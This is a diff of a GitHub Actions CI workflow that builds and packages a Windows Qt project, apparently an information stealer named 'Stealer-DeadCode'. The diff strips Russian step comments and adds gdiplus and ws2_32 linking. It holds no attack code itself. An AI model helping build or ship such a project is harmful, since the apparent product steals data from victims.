@@ -11,8 +11,8 @@ on:
         default: '1'
 
 env:
-  VCPKG_COMMIT: "a73c889be74ece2c6654b580133e0e267e879255"  # Стабильный коммит vcpkg
-  QT_VERSION: "6.5.3"  # Версия Qt 6 для совместимости с mainwindow.cpp
+  VCPKG_COMMIT: "a73c889be74ece2c6654b580133e0e267e879255"
+  QT_VERSION: "6.5.3"
 
 jobs:
   build-windows:
@@ -20,20 +20,17 @@ jobs:
     timeout-minutes: 120
 
     steps:
-    # Шаг 1: Клонирование репозитория
     - name: Checkout repository
       uses: actions/checkout@v4
       with:
         path: Stealer-DeadCode
         fetch-depth: 0
 
-    # Шаг 2: Установка Python
     - name: Setup Python
       uses: actions/setup-python@v5
       with:
         python-version: '3.12'
 
-    # Шаг 3: Установка Chocolatey
     - name: Setup Chocolatey
       run: |
         Write-Host "Checking for Chocolatey installation..."
@@ -54,7 +51,6 @@ jobs:
         }
       shell: powershell
 
-    # Шаг 4: Установка 7-Zip
     - name: Install 7-Zip
       run: |
         Write-Host "Installing 7-Zip..."
@@ -66,7 +62,6 @@ jobs:
         $env:Path = "C:\Program Files\7-Zip;" + $env:Path
       shell: powershell
 
-    # Шаг 5: Кэширование Qt
     - name: Cache Qt
       id: cache-qt
       uses: actions/cache@v4
@@ -76,7 +71,6 @@ jobs:
         restore-keys: |
           qt-${{ env.QT_VERSION }}-${{ runner.os }}-win64_mingw-
 
-    # Шаг 6: Установка Qt и MinGW
     - name: Install Qt 6.5.3 and MinGW
       if: steps.cache-qt.outputs.cache-hit != 'true'
       run: |
@@ -99,7 +93,6 @@ jobs:
         g++ --version
       shell: powershell
 
-    # Шаг 7: Проверка Qt и MinGW
     - name: Verify Qt and MinGW
       run: |
         Write-Host "Verifying Qt and MinGW..."
@@ -135,7 +128,6 @@ jobs:
         }
       shell: powershell
 
-    # Шаг 8: Кэширование vcpkg
     - name: Cache vcpkg
       uses: actions/cache@v4
       with:
@@ -146,7 +138,6 @@ jobs:
         restore-keys: |
           vcpkg-${{ env.VCPKG_COMMIT }}-
 
-    # Шаг 9: Установка vcpkg
     - name: Setup vcpkg
       run: |
         Write-Host "Setting up vcpkg..."
@@ -166,19 +157,17 @@ jobs:
         }
       shell: powershell
 
-    # Шаг 10: Установка зависимостей vcpkg
     - name: Install vcpkg dependencies
       run: |
         Set-Location C:\vcpkg
         Write-Host "Installing vcpkg dependencies..."
-        .\vcpkg.exe install sqlite3:x64-mingw-dynamic curl:x64-mingw-dynamic openssl:x64-mingw-dynamic libzip:x64-mingw-dynamic bzip2:x64-mingw-dynamic zlib:x64-mingw-dynamic --triplet x64-mingw-dynamic --clean-after-build
+        .\vcpkg.exe install sqlite3:x64-mingw-dynamic curl:x64-mingw-dynamic openssl:x64-mingw-dynamic libzip:x64-mingw-dynamic bzip2:x64-mingw-dynamic zlib:x64-mingw-dynamic gdiplus:x64-mingw-dynamic --triplet x64-mingw-dynamic --clean-after-build
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: Failed to install dependencies"
           exit 1
         }
       shell: powershell
 
-    # Шаг 11: Проверка структуры проекта
     - name: Verify project structure
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
@@ -207,7 +196,6 @@ jobs:
         Write-Host "Project structure verified"
       shell: powershell
 
-    # Шаг 12: Исправление кодировки исходных файлов
     - name: Fix encoding of source files
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
@@ -224,7 +212,6 @@ jobs:
         }
       shell: powershell
 
-    # Шаг 13: Генерация UI-файлов
     - name: Generate UI files
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
@@ -239,7 +226,6 @@ jobs:
         Write-Host "ui_mainwindow.h generated"
       shell: powershell
 
-    # Шаг 14: Конфигурация и сборка
     - name: Configure and build
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
@@ -260,7 +246,11 @@ jobs:
         
         Set-Location build
         Write-Host "Running qmake..."
-        qmake ..\ui\DeadCode.pro CONFIG+=release QMAKE_INCDIR+="C:\vcpkg\installed\x64-mingw-dynamic\include" QMAKE_LIBDIR+="C:\vcpkg\installed\x64-mingw-dynamic\lib" LIBS+="-lsqlite3 -lcurl -lssl -lcrypto -lzip -lbz2 -lz -lgdiplus" DEFINES+="BUILD_DATE=\\\"$buildDate\\\"" DEFINES+="BUILD_VERSION=\\\"$buildVersion\\\""
+        qmake ..\ui\DeadCode.pro CONFIG+=release `
+              QMAKE_INCDIR+="C:\vcpkg\installed\x64-mingw-dynamic\include" `
+              QMAKE_LIBDIR+="C:\vcpkg\installed\x64-mingw-dynamic\lib" `
+              LIBS+="-lsqlite3 -lcurl -lssl -lcrypto -lzip -lbz2 -lz -lgdiplus -lws2_32" `
+              DEFINES+="BUILD_DATE=\\\\\\\"$buildDate\\\\\\\" BUILD_VERSION=\\\\\\\"$buildVersion\\\\\\\""
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: qmake failed"
           exit 1
@@ -281,7 +271,6 @@ jobs:
         Write-Host "Build completed"
       shell: powershell
 
-    # Шаг 15: Развёртывание зависимостей Qt
     - name: Deploy Qt dependencies
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
@@ -295,7 +284,6 @@ jobs:
         Write-Host "Qt dependencies deployed"
       shell: powershell
 
-    # Шаг 16: Копирование vcpkg-зависимостей
     - name: Copy vcpkg dependencies
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
@@ -326,7 +314,6 @@ jobs:
         Write-Host "vcpkg dependencies copied"
       shell: powershell
 
-    # Шаг 17: Копирование дополнительных файлов
     - name: Copy additional files
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
@@ -336,7 +323,6 @@ jobs:
         Write-Host "Additional files copied"
       shell: powershell
 
-    # Шаг 18: Проверка наличия всех файлов
     - name: Verify all files
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
@@ -376,7 +362,6 @@ jobs:
         Write-Host "All required files checked"
       shell: powershell
 
-    # Шаг 19: Создание артефакта
     - name: Create artifact
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build
@@ -387,7 +372,6 @@ jobs:
         }
       shell: powershell
 
-    # Шаг 20: Загрузка артефакта
     - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
@@ -395,7 +379,6 @@ jobs:
         path: $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\DeadCode-Portable.zip
         if-no-files-found: error
 
-    # Шаг 21: Очистка
     - name: Cleanup
       if: always()
       run: |
